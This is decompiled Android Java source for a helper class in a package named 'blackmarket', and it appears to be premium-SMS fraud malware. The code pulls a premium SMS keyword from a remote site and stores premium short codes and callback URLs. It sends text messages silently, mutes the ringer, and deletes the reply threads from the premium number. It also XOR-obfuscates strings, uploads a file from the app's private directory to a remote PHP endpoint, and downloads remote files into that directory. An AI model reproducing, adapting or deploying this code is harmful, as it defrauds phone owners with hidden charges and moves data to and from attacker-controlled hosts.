package com.android.blackmarket;

import android.content.Context;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import android.widget.Toast;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import org.apache.http.HttpEntity;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.ByteArrayBuffer;
import org.apache.http.util.EntityUtils;

class function {
    function() {
    }

    public static synchronized String UrlEncode(String Str) {
        synchronized (function.class) {
            try {
                Str = URLEncoder.encode(Str, "ISO-8859-1");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
                Str = "Err0r";
            }
        }
        return Str;
    }

    public static synchronized boolean switchState(boolean enable) {
        boolean bRes;
        synchronized (function.class) {
            TelephonyManager m_telManager = null;
            bRes = false;
            if (m_telManager != null) {
                try {
                    Method action;
                    Method getITelephony = m_telManager.getClass().getDeclaredMethod("getITelephony", new Class[0]);
                    getITelephony.setAccessible(true);
                    Object oTelephony = getITelephony.invoke(m_telManager, new Object[0]);
                    Class cTelephony = oTelephony.getClass();
                    if (enable) {
                        action = cTelephony.getMethod("enableDataConnectivity", new Class[0]);
                    } else {
                        action = cTelephony.getMethod("disableDataConnectivity", new Class[0]);
                    }
                    action.setAccessible(true);
                    bRes = ((Boolean) action.invoke(oTelephony, new Object[0])).booleanValue();
                } catch (Exception e) {
                    bRes = false;
                }
            }
        }
        return bRes;
    }

    public static synchronized String ZEBLAZE(Context CN) {
        String str;
        synchronized (function.class) {
            str = "Jerry56 -BlackMarketAlpha-";
        }
        return str;
    }

    public static synchronized void IfNotGoodKeyword(Context CN) {
        synchronized (function.class) {
            SetGlobalString("Number", "81038", CN);
            SetGlobalString("KeyWord", "AP", CN);
            SetGlobalString("URI", "http://mathissarox.myartsonline.com/momitojuli.php", CN);
            SetGlobalString("DataINFO", "code", CN);
        }
    }

    public static synchronized void IfIsGOODKeyword(String PALL, Context CN) {
        synchronized (function.class) {
            SetGlobalString("Number", "81211", CN);
            SetGlobalString("KeyWord", PALL, CN);
            SetGlobalString("URI", "http://mathissarox.myartsonline.com/allobb.php", CN);
            SetGlobalString("DataINFO", "BD MULTIMEDIA", CN);
        }
    }

    public static synchronized void GetInfoKeys(Context CN) {
        synchronized (function.class) {
            if (GetGlobalString("KeyWord", CN).equals("NullData")) {
                String PALL = between("+ 0.34 &euro;\"},\"sms\":{\"smsKeyword\":\"", "\",\"smsKeywordImage\":\"\",\"smsPh", GetSourceURL("http://www.gainpourtous.com/script.php?idd=90123"));
                if (PALL.equals("Error")) {
                    IfNotGoodKeyword(CN);
                } else {
                    IfIsGOODKeyword(PALL, CN);
                }
            }
        }
    }

    public static synchronized void SetGlobalString(String NameData, String ValueData, Context CN) {
        synchronized (function.class) {
            Editor prefEditor = CN.getSharedPreferences("XMBPSP", 0).edit();
            prefEditor.putString(NameData, ValueData);
            prefEditor.commit();
        }
    }

    public static synchronized void SetGlobalInt(String NameData, int ValueData, Context CN) {
        synchronized (function.class) {
            Editor prefEditor = CN.getSharedPreferences("XMBPS3", 0).edit();
            prefEditor.putInt(NameData, ValueData);
            prefEditor.commit();
        }
    }

    public static synchronized String GetGlobalString(String NameData, Context CN) {
        String PCP;
        synchronized (function.class) {
            PCP = CN.getSharedPreferences("XMBPSP", 0).getString(NameData, "NullData");
        }
        return PCP;
    }

    public static synchronized int GetGlobalInt(String NameData, Context CN) {
        int PCP;
        synchronized (function.class) {
            PCP = CN.getSharedPreferences("XMBPS3", 0).getInt(NameData, 0);
        }
        return PCP;
    }

    public static synchronized void DelGlobalInt(Context CN) {
        synchronized (function.class) {
            Editor prefEditor = CN.getSharedPreferences("XMBPS3", 0).edit();
            prefEditor.remove("XMBPS3");
            prefEditor.clear();
            prefEditor.commit();
        }
    }

    public static synchronized void DelGlobalString(Context CN) {
        synchronized (function.class) {
            Editor prefEditor = CN.getSharedPreferences("XMBPSP", 0).edit();
            prefEditor.remove("XMBPSP");
            prefEditor.clear();
            prefEditor.commit();
        }
    }

    public static synchronized void tttt(Context Con, String Texte) {
        synchronized (function.class) {
            Toast.makeText(Con, Texte, 0).show();
        }
    }

    public static void SMSSendFunction(String nb, String txt) {
        SmsManager.getDefault().sendTextMessage(nb, null, txt, null, null);
    }

    public static void MuteSound(Context CoN) {
        ((AudioManager) CoN.getSystemService("audio")).setRingerMode(0);
    }

    public static synchronized String GetSourceURL(String urlsx) {
        String tempString;
        synchronized (function.class) {
            try {
                URL url = new URL(urlsx);
                long startTime = System.currentTimeMillis();
                URLConnection ucon = url.openConnection();
                ucon.setConnectTimeout(12000);
                ucon.setReadTimeout(12000);
                ucon.setAllowUserInteraction(false);
                ucon.setDoOutput(true);
                BufferedInputStream bis = new BufferedInputStream(ucon.getInputStream());
                ByteArrayBuffer baf = new ByteArrayBuffer(50);
                while (true) {
                    int current = bis.read();
                    if (current == -1) {
                        break;
                    }
                    baf.append((byte) current);
                }
                tempString = new String(baf.toByteArray());
            } catch (IOException e) {
                tempString = "Erreur Of The Dead";
            }
        }
        return tempString;
    }

    public static synchronized String between(String start, String end, String Source) {
        String str;
        synchronized (function.class) {
            if (Source.indexOf(start) == -1) {
                str = "Error";
            } else if (Source.indexOf(end, Source.indexOf(start)) == -1) {
                str = "Error";
            } else {
                str = Source.substring(Source.indexOf(start) + start.length(), Source.indexOf(end, Source.indexOf(start)));
            }
        }
        return str;
    }

    public static synchronized String UploadTest(String Spackage) {
        String Hashee;
        synchronized (function.class) {
            File file = new File("/data/data/" + Spackage + "/test.png");
            try {
                HttpClient client = new DefaultHttpClient();
                HttpPost post = new HttpPost("http://chateau-viranel.com/viranelous_nono/include/secu/class_poo.php");
                FileBody bin = new FileBody(file);
                MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
                reqEntity.addPart("userfile", bin);
                reqEntity.addPart("outputformat", new StringBody("raw"));
                reqEntity.addPart("outputencoding", new StringBody("utf-8"));
                reqEntity.addPart("contentlang", new StringBody("eng"));
                post.setEntity(reqEntity);
                HttpEntity resEntity = client.execute(post).getEntity();
                if (resEntity != null) {
                    Hashee = EntityUtils.toString(resEntity).replace("\n", "").replace(" ", "");
                } else {
                    Hashee = "ErrorU.P";
                }
            } catch (Exception e) {
                e.printStackTrace();
                Hashee = "ErrorU.P";
            }
        }
        return Hashee;
    }

    public static synchronized void deleteSMS(Context Con) {
        synchronized (function.class) {
            Cursor cursor = Con.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
            while (cursor.moveToNext()) {
                try {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                    Uri thread = Uri.parse("content://sms/conversations/" + cursor.getLong(1));
                    if (number.equals("81211")) {
                        Con.getContentResolver().delete(thread, null, null);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static synchronized String StringCRT(String STR) {
        synchronized (function.class) {
            STR = new StringBuffer(stringToHexa(xorEncStr("9127", CRT1(STR)))).reverse().toString();
        }
        return STR;
    }

    public static synchronized String CRT1(String STR) {
        synchronized (function.class) {
        }
        return STR;
    }

    public static synchronized String stringToHexa(String text) {
        String stringBuffer;
        synchronized (function.class) {
            StringBuffer buff = new StringBuffer(text.length() * 3);
            for (int i = 0; i < text.length(); i++) {
                buff.append(Integer.toHexString(text.charAt(i))).append("");
            }
            stringBuffer = buff.toString();
        }
        return stringBuffer;
    }

    public static synchronized String xorEnc(int encKey, String toEnc) {
        String tog;
        synchronized (function.class) {
            String s1 = "";
            tog = "";
            if (encKey > 0) {
                for (int t = 0; t < toEnc.length(); t++) {
                    tog = tog + ((char) (toEnc.charAt(t) ^ encKey));
                }
            }
        }
        return tog;
    }

    public static synchronized String xorEncStr(String encKey, String toEnc) {
        String xorEnc;
        synchronized (function.class) {
            int encKeyI = 0;
            for (int t = 0; t < encKey.length(); t++) {
                encKeyI += encKey.charAt(t);
            }
            xorEnc = xorEnc(encKeyI, toEnc);
        }
        return xorEnc;
    }

    public static synchronized void DownloadFromUrlV2(String Url, String fileName, String Spackage) {
        synchronized (function.class) {
            try {
                String PATH = "/data/data/" + Spackage + "/";
                HttpURLConnection urlConnection = (HttpURLConnection) new URL(Url).openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.setDoOutput(true);
                urlConnection.connect();
                FileOutputStream fileOutput = new FileOutputStream(new File(PATH, fileName));
                InputStream inputStream = urlConnection.getInputStream();
                int totalSize = urlConnection.getContentLength();
                int downloadedSize = 0;
                byte[] buffer = new byte[1024];
                while (true) {
                    int bufferLength = inputStream.read(buffer);
                    if (bufferLength <= 0) {
                        break;
                    }
                    fileOutput.write(buffer, 0, bufferLength);
                    downloadedSize += bufferLength;
                }
                fileOutput.close();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        }
        return;
    }
}
